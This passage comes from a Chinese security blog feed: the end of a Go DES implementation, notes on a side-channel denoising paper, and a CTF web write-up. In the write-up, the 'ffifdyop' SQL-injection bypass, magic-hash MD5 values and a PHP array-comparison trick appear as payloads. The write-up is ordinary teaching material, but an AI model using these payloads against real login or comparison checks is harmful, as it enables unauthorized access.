<span class="number">8</span>, <span class="number">4</span>,</span><br><span class="line">		<span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>&#125;,</span><br><span class="line">	&#123;<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">		<span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">		<span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line">		<span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>&#125;,</span><br><span class="line">	&#123;<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line">		<span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">		<span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>,</span><br><span class="line">		<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>&#125;,</span><br><span class="line">	&#123;<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>,</span><br><span class="line">		<span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">		<span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">		<span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>&#125;,</span><br><span class="line">	&#123;<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>,</span><br><span class="line">		<span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">		<span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>,</span><br><span class="line">		<span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// p置换</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pDisplace = []<span class="type">int</span>&#123;</span><br><span class="line">	<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">	<span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">	<span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>,</span><br><span class="line">	<span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">	<span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>,</span><br><span class="line">	<span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>,</span><br><span class="line">	<span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>,</span><br><span class="line">	<span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// goRound进行16轮迭代</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">goRound</span><span class="params">(leftData, rightData, subKey []<span class="type">int</span>)</span></span> ([]<span class="type">int</span>, []<span class="type">int</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> rightData, dealXor(leftData, Feistel(rightData, subKey))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//f函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Feistel</span><span class="params">(rightData, subKey []<span class="type">int</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">	rightData = displace(ebox, rightData, <span class="number">48</span>) <span class="comment">// e扩展</span></span><br><span class="line">	Data := dealXor(rightData, subKey)</span><br><span class="line">	Data = sBox(Data) <span class="comment">// s盒压缩</span></span><br><span class="line">	Data = displace(pDisplace, Data, <span class="number">32</span>)</span><br><span class="line">	<span class="keyword">return</span> Data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子密钥生成分支</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">generateKey</span><span class="params">(data <span class="type">string</span>)</span></span> [][]<span class="type">int</span> &#123;</span><br><span class="line">	formKey := byteConBit(data)</span><br><span class="line">	resList := <span class="built_in">make</span>([][]<span class="type">int</span>, <span class="number">16</span>, <span class="number">48</span>)</span><br><span class="line">	<span class="keyword">var</span> off = []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// pc-1置换</span></span><br><span class="line">	formKey = displace(pc1Table, formKey, <span class="built_in">len</span>(pc1Table))</span><br><span class="line">	leftKey := formKey[:<span class="built_in">len</span>(formKey)/<span class="number">2</span>]</span><br><span class="line">	rightKey := formKey[<span class="built_in">len</span>(formKey)/<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">	TempresList := <span class="built_in">make</span>([][]<span class="type">int</span>, <span class="number">16</span>, <span class="number">56</span>)</span><br><span class="line">	<span class="comment">// 双左移且迭代16次</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(off); i++ &#123;</span><br><span class="line">		leftKey = leftOffX(leftKey, off[i])</span><br><span class="line">		rightKey = leftOffX(rightKey, off[i])</span><br><span class="line">		TempresList[i] = <span class="built_in">append</span>(leftKey, rightKey...)</span><br><span class="line">		resList[i] = displace(pc2Table, TempresList[i], <span class="built_in">len</span>(pc2Table))</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// fmt.Println(resList)</span></span><br><span class="line">	<span class="comment">// pc-2置换</span></span><br><span class="line">	<span class="keyword">return</span> resList</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环左移函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">leftOffX</span><span class="params">(key []<span class="type">int</span>, off <span class="type">int</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">append</span>(key[off:], key[:off]...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//字节转换为比特 &lt;= 8字节</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">byteConBit</span><span class="params">(data <span class="type">string</span>)</span></span> (initDataList []<span class="type">int</span>) &#123;</span><br><span class="line">	newData := []<span class="type">uint8</span>(data) <span class="comment">// 将数据全部转化为比特</span></span><br><span class="line">	initDataList = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">64</span>)</span><br><span class="line">	toBinaryList := <span class="string">&quot;&quot;</span> <span class="comment">// 存放下边填充后的toBinary</span></span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> newData &#123;</span><br><span class="line">		<span class="comment">// newData组里每个元素都转为2进制</span></span><br><span class="line">		toBinary := strconv.FormatUint(<span class="type">uint64</span>(v), <span class="number">2</span>)</span><br><span class="line">		<span class="keyword">for</span> <span class="built_in">len</span>(toBinary) &lt; <span class="number">8</span> &#123;</span><br><span class="line">			toBinary = <span class="string">&quot;0&quot;</span> + toBinary</span><br><span class="line">		&#125;</span><br><span class="line">		toBinaryList += toBinary</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(toBinaryList); i++ &#123;</span><br><span class="line">		initDataList[i], _ = strconv.Atoi(<span class="type">string</span>(toBinaryList[i])) <span class="comment">// 这里如果不满足指定位数会大端序补零</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密置换</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">decodeByteConBit</span><span class="params">(newData []<span class="type">uint8</span>)</span></span> (initDataList []<span class="type">int</span>) &#123;</span><br><span class="line">	initDataList = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">64</span>)</span><br><span class="line">	toBinaryList := <span class="string">&quot;&quot;</span> <span class="comment">// 存放下边填充后的toBinary</span></span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> newData &#123;</span><br><span class="line">		<span class="comment">// newData组里每个元素都转为2进制</span></span><br><span class="line">		toBinary := strconv.FormatUint(<span class="type">uint64</span>(v), <span class="number">2</span>)</span><br><span class="line">		<span class="keyword">for</span> <span class="built_in">len</span>(toBinary) &lt; <span class="number">8</span> &#123;</span><br><span class="line">			toBinary = <span class="string">&quot;0&quot;</span> + toBinary</span><br><span class="line">		&#125;</span><br><span class="line">		toBinaryList += toBinary</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(toBinaryList); i++ &#123;</span><br><span class="line">		initDataList[i], _ = strconv.Atoi(<span class="type">string</span>(toBinaryList[i])) <span class="comment">// 这里如果不满足指定位数会大端序补零</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个盒table, 修改的表data, 输出长度length 用于置换</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">displace</span><span class="params">(table []<span class="type">int</span>, data []<span class="type">int</span>, length <span class="type">int</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">	resTable := <span class="built_in">make</span>([]<span class="type">int</span>, length)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; length; i++ &#123;</span><br><span class="line">		resTable[i] = data[table[i]<span class="number">-1</span>]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> resTable</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 异或函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">dealXor</span><span class="params">(a, b []<span class="type">int</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">	xoResult := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="built_in">len</span>(a))</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(a); i++ &#123;</span><br><span class="line">		xoResult[i] = a[i] ^ b[i]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> xoResult</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sBox</span><span class="params">(data []<span class="type">int</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">	resStr := <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">8</span>; i++ &#123;</span><br><span class="line">		s := data[i*<span class="number">6</span> : (i+<span class="number">1</span>)*<span class="number">6</span>]</span><br><span class="line">		x := s[<span class="number">0</span>]*<span class="number">2</span> + s[<span class="number">5</span>]</span><br><span class="line">		y := s[<span class="number">1</span>]*<span class="number">8</span> + s[<span class="number">2</span>]*<span class="number">4</span> + s[<span class="number">3</span>]*<span class="number">2</span> + s[<span class="number">4</span>]</span><br><span class="line">		<span class="comment">// s盒关键处理</span></span><br><span class="line">		temp := strconv.FormatInt(<span class="type">int64</span>(sBoxzip[i][x*<span class="number">16</span>+y]), <span class="number">2</span>)</span><br><span class="line">		<span class="keyword">for</span> <span class="built_in">len</span>(temp) &lt; <span class="number">4</span> &#123;</span><br><span class="line">			temp = <span class="string">&quot;0&quot;</span> + temp</span><br><span class="line">		&#125;</span><br><span class="line">		resStr += temp</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	res := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="built_in">len</span>(resStr))</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(resStr); i++ &#123;</span><br><span class="line">		res[i], _ = strconv.Atoi(<span class="type">string</span>(resStr[i]))</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到的二进制数组转换为字符串</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">binToByte</span><span class="params">(data []<span class="type">int</span>)</span></span> (result []<span class="type">uint8</span>) &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">8</span>; i++ &#123;</span><br><span class="line">		tempStr := <span class="string">&quot;&quot;</span></span><br><span class="line">		binData := data[i*<span class="number">8</span> : (i+<span class="number">1</span>)*<span class="number">8</span>]</span><br><span class="line">		<span class="keyword">for</span> _, v := <span class="keyword">range</span> binData &#123;</span><br><span class="line">			tempStr += strconv.Itoa(v)</span><br><span class="line">		&#125;</span><br><span class="line">		temp, _ := strconv.ParseInt(tempStr, <span class="number">2</span>, <span class="number">64</span>)</span><br><span class="line">		result = <span class="built_in">append</span>(result, <span class="type">uint8</span>(temp))</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">formData</span><span class="params">(data <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">des</span><span class="params">(data <span class="type">string</span>, cipherKey <span class="type">string</span>)</span></span> (resList []<span class="type">int</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(data)%<span class="number">8</span> != <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">var</span> crush <span class="type">byte</span></span><br><span class="line">		<span class="comment">// 填充字符串</span></span><br><span class="line">		dataLackLength := <span class="number">8</span> - <span class="built_in">len</span>(data)%<span class="number">8</span></span><br><span class="line">		<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; dataLackLength; i++ &#123;</span><br><span class="line">			data += <span class="type">string</span>(crush)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="built_in">len</span>(data))</span><br><span class="line">	plainText := displace(ipDisplace, byteConBit(data), <span class="built_in">len</span>(ipDisplace))</span><br><span class="line">	<span class="comment">// 子密钥生成</span></span><br><span class="line">	childrenKeyList := generateKey(cipherKey) <span class="comment">// 16轮子密钥获取 Ki</span></span><br><span class="line">	<span class="comment">// 加密</span></span><br><span class="line">	leftData := plainText[:<span class="built_in">len</span>(plainText)/<span class="number">2</span>]</span><br><span class="line">	rightData := plainText[<span class="built_in">len</span>(plainText)/<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(childrenKeyList); i++ &#123;</span><br><span class="line">		leftData, rightData = goRound(leftData, rightData, childrenKeyList[i])</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// print(&quot;迭代结果:&quot;)</span></span><br><span class="line">	<span class="comment">// fmt.Println(append(leftData, rightData...))</span></span><br><span class="line">	resList = displace(reIpDisplace, <span class="built_in">append</span>(rightData, leftData...), <span class="number">64</span>)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//IP置换</span></span><br><span class="line"></span><br><span class="line">	fmt.Println(des(<span class="string">&quot;桂林&quot;</span>, <span class="string">&quot;11223344&quot;</span>))</span><br><span class="line"></span><br><span class="line">	encode_res := des(<span class="string">&quot;桂林&quot;</span>, <span class="string">&quot;11223344&quot;</span>)</span><br><span class="line"></span><br><span class="line">	decodeText := displace(ipDisplace, encode_res, <span class="number">64</span>)</span><br><span class="line">	leftDecodeData := decodeText[:<span class="built_in">len</span>(decodeText)/<span class="number">2</span>]</span><br><span class="line">	rightDecodeData := decodeText[<span class="built_in">len</span>(decodeText)/<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">	childrenKeyList := generateKey(<span class="string">&quot;11223344&quot;</span>)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">15</span>; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">		leftDecodeData, rightDecodeData = goRound(leftDecodeData, rightDecodeData, childrenKeyList[i])</span><br><span class="line">	&#125;</span><br><span class="line">	decode_res := displace(reIpDisplace, <span class="built_in">append</span>(rightDecodeData, leftDecodeData...), <span class="number">64</span>)</span><br><span class="line">	fmt.Print(<span class="string">&quot;解密结果:&quot;</span>)</span><br><span class="line">	fmt.Println(<span class="type">string</span>(binToByte(decode_res)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里代码还没有整理, 先push上能跑起来, 结果如下:</p>
<p>加密过后生成的64bit的密文</p>
<p><img src="../img/image-20220805183720593.png" alt="image-20220805183720593"></p>
<p>解密:</p>
<p><img src="../img/image-20220805184012653.png" alt="image-20220805184012653"></p>
]]></content>
      <categories>
        <category>算法过程分析</category>
      </categories>
      <tags>
        <tag>对称密码算法</tag>
      </tags>
  </entry>
  <entry>
    <title>文献阅读笔记-CDAE: Towards Empowering Denoising in Side-Channel Analysis</title>
    <url>/archives/c4b22as16.html</url>
    <content><![CDATA[<h1>文章信息</h1>
<ul>
<li>
<p>作者：<strong>Guang Yang, Huizhong Li, Jingdian Ming and Yongbin Zhou</strong></p>
</li>
<li>
<p>单位：<strong>State Key Laboratory of Information Security, Institute of Information Engineering, Chinese Academy of Sciences, Beijing, China</strong></p>
</li>
<li>
<p>出处：<strong>International Conference on Information and Communications Security</strong></p>
</li>
<li>
<p>标题：<strong>CDAE: Towards Empowering Denoising in Side-Channel Analysis</strong></p>
</li>
</ul>
<h1>文章内容</h1>
<blockquote>
<p>作者认为噪声通常会对密钥恢复效率有负影响，基于此采取自编码器来对输入的能量迹进行降噪处理，对处理过后的能量迹做分类效果较好，仅需原来的50%输入即可实现恢复任务。</p>
</blockquote>
<p><img src="../img/image-20231129161303258.png" alt="工作流程"></p>
<p>PS：最后的K是对应攻击位置</p>
<h2 id="技术">技术</h2>
<h3 id="CDAE">CDAE</h3>
<img src="../img/image-20231129161914935.png" alt="AE结构" style="zoom:67%;" />
<p>提取特征这里采用的是最大池化层，最近发现读了几篇AE-SCA都是用的Maxpooling，这样会把能量高的点给保留下来，最后解码器这块儿用的上采样加速收敛速度。</p>
<h3 id="未加掩码能量迹降噪流程">未加掩码能量迹降噪流程</h3>
<p><img src="../img/image-20231129200440844.png" alt="流程"></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">输入原始能量迹集合Xprofiling，中间值V；输出降噪后的能量迹Xtrain</span><br><span class="line">初始化一个空集合S</span><br><span class="line">在有限域2^8上的v，V从1到N</span><br><span class="line"><span class="code">		计算given v 的X期望，也就是所有中间值为V的能量迹平均值x̄</span></span><br><span class="line"><span class="code">		把x append set S</span></span><br><span class="line"><span class="code">初始化 null set Xtrain</span></span><br><span class="line"><span class="code">在Xprofiling中 i从1到N</span></span><br><span class="line"><span class="code">		取出i对应的x̄，插入（xi, x̄i)到Xtrain中</span></span><br><span class="line"><span class="code">返回Xtrain</span></span><br></pre></td></tr></table></figure>
<h3 id="带掩码的能量迹降噪流程">带掩码的能量迹降噪流程</h3>
<img src="../img/image-20231129203429234.png" alt="一阶能量迹降噪" style="zoom:67%;" />
<img src="../img/image-20231129205346057.png" alt="Xv, Xm" style="zoom:50%;" />
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Xm是针对mask的分布，但是文中没有给g和fai的具体解释，这里不太清楚</span><br><span class="line"></span><br><span class="line">输入Xprofiling（掩码后的能量迹||Xm）， 中间值V， 掩码集合M</span><br><span class="line">基本流程同上</span><br></pre></td></tr></table></figure>
<h3 id="激活函数">激活函数</h3>
<img src="../img/image-20231129205537345.png" alt="image-20231129205537345" style="zoom:63%;" />
<p>由训练流程可得目标是为了尽可能缩小输出分布与x̄的偏差，如果是x̄刚好又会增加信噪比。</p>
<h2 id="实验结果">实验结果</h2>
<p><img src="../img/image-20231129210045309.png" alt="信噪比"></p>
<img src="../img/image-20231129210110207.png" alt="结果" style="zoom:50%;" />
<p>在数据集AES_GPU上结果如图所示，可以看到该方法提高了信噪比和PCC（皮尔逊相关系数），并且在攻击时猜测熵指标有很大的提升。</p>
<img src="../img/image-20231129210546896.png" alt="DPAv2" style="zoom:80%;" />
<img src="../img/image-20231129210609237.png" alt="ASCAD" style="zoom:67%;" />
]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>数据预处理</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-WEB-PHP</title>
    <url>/archives/add26f5f.html</url>
    <content><![CDATA[<h2 id="BJDCTF2020-Easy-MD5">[BJDCTF2020]Easy MD5</h2>
<p><img src="../img/image-20220907103623092.png" alt="image-20220907103623092"></p>
<p>用<code>burpsuite</code>测试一下,发现回包里有hint如下.</p>
<p><img src="../img/image-20220907104122114.png" alt="image-20220907104122114"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">where</span> password<span class="operator">=</span>md5($pass,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure>
<p>这里要构造sql注入的话, 就必须让<code>password=md5($pass, true)</code>永真</p>
<p><strong>MD5()</strong></p>
<blockquote>
<p>md5(<em>string,raw</em>)</p>
</blockquote>
<p>string : 要计算的字符串</p>
<p>raw: 当raw = <code>true</code> 以string的形式返回, 即返回字符型 当raw=<code>false</code> 返回原始md5的32位数据</p>
<p>这里true就给我们构造永真的机会了, 只需要某个string的md5值等于’ or '数字(非0)即可闭合数据</p>
<p><strong>ffifdyop</strong> 这个字符串md5值等于 <strong>276f722736c95d99e921722cf9ed621c</strong></p>
<p><img src="../img/image-20220907110955831.png" alt="image-20220907110955831"></p>
<p>其结果就是’or’6 即可构造闭合语句 <code>select * from 'admin' where password='or'6'</code>即绕过</p>
<p>提交之后来到第二关</p>
<p><img src="../img/image-20220907111140043.png" alt="image-20220907111140043"></p>
<p>源代码如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<p>构造get传递a、b 两个参数, 且要a!=b,而且a的md5值与b的md5值相等,找两个md5等于0exxxxxxxxx就可以,即md5碰撞</p>
<p>payload: <code>url/levels91.php?a=240610708&amp;b=QNKCDZO</code></p>
<p>提交之后到达第三关</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里考察的就是md5的强碰撞, 但是根据php的特性,强碰撞在数组对比的时候都可以绕过(函数解不出来数组),虽然会报错,但是不会影响跳转到if语句里</p>
<p><img src="../img/image-20220907113838366.png" alt="image-20220907113838366"></p>
<p>这里解法1即</p>
<p><img src="../img/image-20220907112537066.png" alt="image-20220907112537066"></p>
<h2 id="MRCTF2020-你传你🐎呢">[MRCTF2020]你传你🐎呢</h2>
<p><img src="../img/image-20220907154845062.png" alt="image-20220907154845062"></p>
<p>好臭的题</p>
